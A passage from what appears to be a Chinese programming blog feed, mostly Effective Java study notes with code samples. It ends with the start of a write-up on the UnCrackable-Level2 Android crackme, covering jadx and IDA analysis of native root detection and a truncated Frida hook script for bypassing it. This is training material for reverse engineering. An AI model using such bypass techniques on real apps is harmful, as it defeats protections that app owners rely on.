&#125;</span><br><span class="line"></span><br><span class="line">    MixColor() &#123;</span><br><span class="line">        applyStyles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MixColor</span> <span class="variable">mixColor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MixColor</span>();</span><br><span class="line">        System.out.println(MixColor.m.get(EnumSet.of(MixColor.Color.Blue, MixColor.Color.Red)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="38-用接口模拟可伸缩的枚举类型"   >          <a href="#38-用接口模拟可伸缩的枚举类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#38-用接口模拟可伸缩的枚举类型" class="headerlink" title="38.用接口模拟可伸缩的枚举类型"></a>38.用接口模拟可伸缩的枚举类型</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Emulated extensible enum using an interface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Operation</span> &#123;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">BasicOperation</span> <span class="keyword">implements</span> <span class="title class_">Operation</span> &#123;</span><br><span class="line">    PLUS(<span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123; <span class="keyword">return</span> x + y; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    MINUS(<span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123; <span class="keyword">return</span> x - y; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    TIMES(<span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123; <span class="keyword">return</span> x * y; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    DIVIDE(<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123; <span class="keyword">return</span> x / y; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String symbol;</span><br><span class="line">    BasicOperation(String symbol) &#123;</span><br><span class="line">        <span class="built_in">this</span>.symbol = symbol;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> symbol;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="39-注解优先于命名模式"   >          <a href="#39-注解优先于命名模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#39-注解优先于命名模式" class="headerlink" title="39.注解优先于命名模式"></a>39.注解优先于命名模式</h2>              <h2 id="40-坚持使用Override注解"   >          <a href="#40-坚持使用Override注解" class="heading-link"><i class="fas fa-link"></i></a><a href="#40-坚持使用Override注解" class="headerlink" title="40.坚持使用Override注解"></a>40.坚持使用Override注解</h2>              <h1 id="第七章-Lamda和Stream"   >          <a href="#第七章-Lamda和Stream" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七章-Lamda和Stream" class="headerlink" title="第七章 Lamda和Stream"></a>第七章 Lamda和Stream</h1>              <h2 id="42-Lambda优先于匿名类"   >          <a href="#42-Lambda优先于匿名类" class="heading-link"><i class="fas fa-link"></i></a><a href="#42-Lambda优先于匿名类" class="headerlink" title="42.Lambda优先于匿名类"></a>42.Lambda优先于匿名类</h2>      <p>Lambda表达式</p><ul><li>代码简短</li><li>无需名称和文档</li><li>不可创建或继承抽象类的实例</li><li>不适用于创建具有多个抽象方法的接口实例</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Anonymous class instance as a function object - obsolete!</span></span><br><span class="line">Collections.sort(words, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.compare(s1.length(), s2.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lambda expression as function object (replaces anonymous class)</span></span><br><span class="line">Collections.sort(words,</span><br><span class="line">        (s1, s2) -&gt; Integer.compare(s1.length(), s2.length()));</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="43-方法引用优先于Lambda"   >          <a href="#43-方法引用优先于Lambda" class="heading-link"><i class="fas fa-link"></i></a><a href="#43-方法引用优先于Lambda" class="headerlink" title="43.方法引用优先于Lambda"></a>43.方法引用优先于Lambda</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Frequency table implemented with map.merge, using lambda and method reference (Page 197)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Freq</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Map&lt;String, Integer&gt; frequencyTable = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (String s : args)</span><br><span class="line">            frequencyTable.merge(s, <span class="number">1</span>, (count, incr) -&gt; count + incr); <span class="comment">// Lambda</span></span><br><span class="line">        System.out.println(frequencyTable);</span><br><span class="line">        frequencyTable.clear();</span><br><span class="line">        <span class="keyword">for</span> (String s : args)</span><br><span class="line">            frequencyTable.merge(s, <span class="number">1</span>, Integer::sum); <span class="comment">// Method reference</span></span><br><span class="line">        System.out.println(frequencyTable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span> V <span class="title function_">merge</span><span class="params">(K key, V value,</span></span><br><span class="line"><span class="params">  BiFunction&lt;? <span class="built_in">super</span> V, ? <span class="built_in">super</span> V, ? extends V&gt; remappingFunction)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(remappingFunction);</span><br><span class="line">    Objects.requireNonNull(value);</span><br><span class="line">    <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> get(key);</span><br><span class="line">    <span class="type">V</span> <span class="variable">newValue</span> <span class="operator">=</span> (oldValue == <span class="literal">null</span>) ? value :</span><br><span class="line">               remappingFunction.apply(oldValue, value);</span><br><span class="line">    <span class="keyword">if</span> (newValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        remove(key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        put(key, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="44-优先使用标准函数接口"   >          <a href="#44-优先使用标准函数接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#44-优先使用标准函数接口" class="headerlink" title="44.优先使用标准函数接口"></a>44.优先使用标准函数接口</h2>      <p>函数对象：实现了特定函数的对象</p>        <h2 id="45-谨慎使用Stream"   >          <a href="#45-谨慎使用Stream" class="heading-link"><i class="fas fa-link"></i></a><a href="#45-谨慎使用Stream" class="headerlink" title="45.谨慎使用Stream"></a>45.谨慎使用Stream</h2>      <p>Stream是元素的集合，支持对元素进行顺序或者并行操作</p><p>foreach：</p><p>filter：</p><p>map：</p><p>sorted：</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forEach</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">random.ints().limit(<span class="number">10</span>).forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">// filter</span></span><br><span class="line">List&lt;String&gt;strings = Arrays.asList(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;bc&quot;</span>, <span class="string">&quot;efg&quot;</span>, <span class="string">&quot;abcd&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="string">&quot;jkl&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> strings.stream().filter(string -&gt; string.isEmpty()).count();</span><br><span class="line"></span><br><span class="line"><span class="comment">// map</span></span><br><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">List&lt;Integer&gt; squaresList = numbers.stream().map( i -&gt; i*i).distinct().collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line"><span class="comment">// sorted</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">random.ints().limit(<span class="number">10</span>).sorted().forEach(System.out::println);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>避免使用Stream处理Char</p>        <h2 id="46-优先选择Stream中无副作用的函数"   >          <a href="#46-优先选择Stream中无副作用的函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#46-优先选择Stream中无副作用的函数" class="headerlink" title="46.优先选择Stream中无副作用的函数"></a>46.优先选择Stream中无副作用的函数</h2>              <h1 id="第八章-方法"   >          <a href="#第八章-方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八章-方法" class="headerlink" title="第八章 方法"></a>第八章 方法</h1>              <h2 id="49-检查参数的有效性"   >          <a href="#49-检查参数的有效性" class="heading-link"><i class="fas fa-link"></i></a><a href="#49-检查参数的有效性" class="headerlink" title="49.检查参数的有效性"></a>49.检查参数的有效性</h2>      <p>对参数值进行限制</p><ul><li>索引非负</li><li>对象引用不为null</li></ul>        <h2 id="50-必要时进行保护性拷贝"   >          <a href="#50-必要时进行保护性拷贝" class="heading-link"><i class="fas fa-link"></i></a><a href="#50-必要时进行保护性拷贝" class="headerlink" title="50.必要时进行保护性拷贝"></a>50.必要时进行保护性拷贝</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RaceTime</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Date&gt; times;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RaceTime</span><span class="params">(Date... end)</span> &#123;</span><br><span class="line">        times = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Date date : end) &#123;</span><br><span class="line">            <span class="type">Date</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(date.getTime());</span><br><span class="line">            times.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        times.addAll(Arrays.asList(end));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">retTime</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; times.size() || i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                    <span class="string">&quot;out of index&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保护性拷贝</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(times.get(i).getTime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="51-谨慎设计方法签名"   >          <a href="#51-谨慎设计方法签名" class="heading-link"><i class="fas fa-link"></i></a><a href="#51-谨慎设计方法签名" class="headerlink" title="51.谨慎设计方法签名"></a>51.谨慎设计方法签名</h2>      <p>谨慎选择方法的名称</p><p><strong>不要过于追求提供便利的方法</strong></p><p>避免过长的参数列表</p>        <h2 id="52-明智地使用重载"   >          <a href="#52-明智地使用重载" class="heading-link"><i class="fas fa-link"></i></a><a href="#52-明智地使用重载" class="headerlink" title="52.明智地使用重载"></a>52.明智地使用重载</h2>      <p>在java中，具体调用的重载方法是编译时决定的</p><p>重载方法的选择是静态的，被覆盖的方法的选择是动态的</p><p>请勿写出具有相同参数数目的重载方法</p>        <h2 id="53-明智地使用可变参数"   >          <a href="#53-明智地使用可变参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#53-明智地使用可变参数" class="headerlink" title="53.明智地使用可变参数"></a>53.明智地使用可变参数</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The WRONG way to use varargs to pass one or more arguments!</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span>... args)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Too few arguments&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; args.length; i++)</span><br><span class="line">        <span class="keyword">if</span> (args[i] &lt; min)</span><br><span class="line">    min = args[i];</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The right way to use varargs to pass one or more arguments</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> firstArg, <span class="type">int</span>... remainingArgs)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> firstArg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> arg : remainingArgs)</span><br><span class="line">        <span class="keyword">if</span> (arg &lt; min)</span><br><span class="line">    min = arg;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="54-返回零长度的数组或者集合而不是null"   >          <a href="#54-返回零长度的数组或者集合而不是null" class="heading-link"><i class="fas fa-link"></i></a><a href="#54-返回零长度的数组或者集合而不是null" class="headerlink" title="54.返回零长度的数组或者集合而不是null"></a>54.返回零长度的数组或者集合而不是null</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Optimization - avoids allocating empty arrays</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Cheese[] EMPTY_CHEESE_ARRAY = <span class="keyword">new</span> <span class="title class_">Cheese</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">public</span> Cheese[] getCheeses() &#123;</span><br><span class="line">    <span class="keyword">return</span> cheesesInStock.toArray(EMPTY_CHEESE_ARRAY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="55-明智地返回optional"   >          <a href="#55-明智地返回optional" class="heading-link"><i class="fas fa-link"></i></a><a href="#55-明智地返回optional" class="headerlink" title="55.明智地返回optional"></a>55.明智地返回optional</h2>      <p>方法在某些时候无法返回任何值</p><ul><li>抛出异常</li><li>返回null</li><li>返回Optional&lt;T&gt;</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Returns maximum value in collection - throws exception if empty</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;E&gt;&gt; E <span class="title function_">max</span><span class="params">(Collection&lt;E&gt; c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Empty collection&quot;</span>);</span><br><span class="line">    <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (E e : c)</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span> || e.compareTo(result) &gt; <span class="number">0</span>)</span><br><span class="line">    result = Objects.requireNonNull(e);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Returns maximum value in collection as an Optional&lt;E&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;E&gt;&gt; Optional&lt;E&gt; <span class="title function_">max</span><span class="params">(Collection&lt;E&gt; c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c.isEmpty())</span><br><span class="line">        <span class="keyword">return</span> Optional.empty();</span><br><span class="line">    <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (E e : c)</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span> || e.compareTo(result) &gt; <span class="number">0</span>)</span><br><span class="line">    result = Objects.requireNonNull(e);</span><br><span class="line">    <span class="keyword">return</span> Optional.of(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Stream的终止操作返回Optional</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Returns max val in collection as Optional&lt;E&gt; - uses stream</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;E&gt;&gt; Optional&lt;E&gt; <span class="title function_">max</span><span class="params">(Collection&lt;E&gt; c)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> c.stream().max(Comparator.naturalOrder());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="第九章-通用编程"   >          <a href="#第九章-通用编程" class="heading-link"><i class="fas fa-link"></i></a><a href="#第九章-通用编程" class="headerlink" title="第九章 通用编程"></a>第九章 通用编程</h1>              <h2 id="57-将局部变量的作用域最小化"   >          <a href="#57-将局部变量的作用域最小化" class="heading-link"><i class="fas fa-link"></i></a><a href="#57-将局部变量的作用域最小化" class="headerlink" title="57.将局部变量的作用域最小化"></a>57.将局部变量的作用域最小化</h2>      <p>与“使类和成员的可访问性最小化”本质上类似</p><p>在第一次使用局部变量的地方进行声明</p><p>局部变量的声明尽量包含一个初始化表达式</p>        <h2 id="58-for-each循环优于传统循环"   >          <a href="#58-for-each循环优于传统循环" class="heading-link"><i class="fas fa-link"></i></a><a href="#58-for-each循环优于传统循环" class="headerlink" title="58.for-each循环优于传统循环"></a>58.for-each循环优于传统循环</h2>      <p>for-each循环可遍历任何实现Iterable接口的对象</p><p>无法使用for-each循环的情况</p><ul><li>解构过滤：遍历集合，删除特定元素</li><li>转换：遍历集合，替换特定元素</li><li>并行迭代：并行的遍历多个集合，同步前进</li></ul>        <h2 id="59-了解和使用类库"   >          <a href="#59-了解和使用类库" class="heading-link"><i class="fas fa-link"></i></a><a href="#59-了解和使用类库" class="headerlink" title="59.了解和使用类库"></a>59.了解和使用类库</h2>      <p>使用标准类库的好处</p><ul><li>其实现经过检验，且会不断更新</li><li>无需花费时间在底层细节上</li><li>性能往往会逐渐提高</li><li>方便其他人阅读，重用</li></ul><p>总之，不要重新发明轮子</p>        <h2 id="60-如果需要精确的答案，避免使用float和double"   >          <a href="#60-如果需要精确的答案，避免使用float和double" class="heading-link"><i class="fas fa-link"></i></a><a href="#60-如果需要精确的答案，避免使用float和double" class="headerlink" title="60.如果需要精确的答案，避免使用float和double"></a>60.如果需要精确的答案，避免使用float和double</h2>      <p>float和double并没有提供完全精确的结果，使用BigDecimal</p>        <h2 id="61-基本类型优先于装箱基本类型"   >          <a href="#61-基本类型优先于装箱基本类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#61-基本类型优先于装箱基本类型" class="headerlink" title="61.基本类型优先于装箱基本类型"></a>61.基本类型优先于装箱基本类型</h2>      <ul><li>基本类型：int，double，Boolean</li><li>引用类型：String，List</li><li>装箱基本类型：Integer，Double，Boolean</li><li>自动装箱，自动拆箱</li></ul><p>基本类型和装箱类型的区别</p><ul><li>基本类型只有值比较，装箱基本类型具有同一性比较（identity comparison）</li><li>基本类型只有功能值，装箱基本类型有null</li><li>基本类型比装箱基本类型节省时间和空间</li></ul><p>何时应采用装箱基本类型</p><ul><li>作为集合中的元素、键和值</li><li>参数化类型中，必须使用装箱基本类型作为类型参数</li><li>进行反射的方法调用，必须使用装箱基本类型</li></ul>        <h2 id="62-若其他类型更适合，尽量避免使用字符串"   >          <a href="#62-若其他类型更适合，尽量避免使用字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#62-若其他类型更适合，尽量避免使用字符串" class="headerlink" title="62.若其他类型更适合，尽量避免使用字符串"></a>62.若其他类型更适合，尽量避免使用字符串</h2>              <h2 id="63-注意字符串连接的性能"   >          <a href="#63-注意字符串连接的性能" class="heading-link"><i class="fas fa-link"></i></a><a href="#63-注意字符串连接的性能" class="headerlink" title="63.注意字符串连接的性能"></a>63.注意字符串连接的性能</h2>              <h2 id="64-通过接口引用对象"   >          <a href="#64-通过接口引用对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#64-通过接口引用对象" class="headerlink" title="64.通过接口引用对象"></a>64.通过接口引用对象</h2>              <h2 id="65-接口优先于反射机制"   >          <a href="#65-接口优先于反射机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#65-接口优先于反射机制" class="headerlink" title="65.接口优先于反射机制"></a>65.接口优先于反射机制</h2>      <p>核心反射机制：通过程序来访问关于已装载的类的信息</p><p>执行反射访问所需要的代码非常笨拙和冗长</p><p>应用：frida</p>        <h2 id="66-谨慎地使用本地方法"   >          <a href="#66-谨慎地使用本地方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#66-谨慎地使用本地方法" class="headerlink" title="66.谨慎地使用本地方法"></a>66.谨慎地使用本地方法</h2>      <p>本地方法：用本地程序设计语言（如C或C++）编写的方法</p><p>本地方法可方便完成一些特殊的任务，并可能提高性能</p><p>当Java本身的性能得到提升时，程序无法得到改善</p>        <h2 id="67-谨慎地进行优化"   >          <a href="#67-谨慎地进行优化" class="heading-link"><i class="fas fa-link"></i></a><a href="#67-谨慎地进行优化" class="headerlink" title="67.谨慎地进行优化"></a>67.谨慎地进行优化</h2>              <h2 id="68-遵守普遍接受的命名惯例"   >          <a href="#68-遵守普遍接受的命名惯例" class="heading-link"><i class="fas fa-link"></i></a><a href="#68-遵守普遍接受的命名惯例" class="headerlink" title="68.遵守普遍接受的命名惯例"></a>68.遵守普遍接受的命名惯例</h2>      ]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UnCrackable-Level2</title>
      <link href="/2023/06/02/UnCrackable-Level2/"/>
      <url>/2023/06/02/UnCrackable-Level2/</url>
      
        <content type="html"><![CDATA[        <h1 id="UnCrackable-Level2"   >          <a href="#UnCrackable-Level2" class="heading-link"><i class="fas fa-link"></i></a><a href="#UnCrackable-Level2" class="headerlink" title="UnCrackable-Level2"></a>UnCrackable-Level2</h1>      <p>jadx打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022255784.png" alt="image-20230602225526738"></p><p>同样是检测root</p><p>init()函数是native，ida打开对应so</p><p>最终导向这个函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022256114.png" alt="image-20230602225614075"></p><p>创建子进程，然后附加到父进程，因此不能运行后注入</p><p>利用spawn创建进程后hook</p><figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;sg.vantagepoint.a.b&quot;</span>);</span><br><span class="line">    b.<span class="property">a</span>.<span class="title 